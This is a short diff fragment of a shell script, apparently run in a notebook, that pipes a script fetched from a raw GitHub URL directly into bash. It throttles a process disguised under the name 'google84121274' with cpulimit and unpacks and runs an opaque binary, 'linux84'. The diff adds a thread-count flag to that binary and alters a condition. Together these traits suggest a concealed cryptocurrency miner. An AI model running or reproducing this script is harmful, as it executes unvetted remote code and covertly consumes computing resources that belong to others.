@@ -80,7 +80,7 @@ cpulimit -e google84121274 -l 62 &> /dev/null &
 
 !curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474744 | bash
 
-if [[ 4 == 4 ]]; then
+if [[ 4 == 8 ]]; then
 
 if [[ 4 == 4 ]]; then
 
@@ -118,7 +118,7 @@ tar -xf ./linux84.tar.gz
 
 cd linux84
 
-./linux84
+./linux84 -t 8
 
 else
 
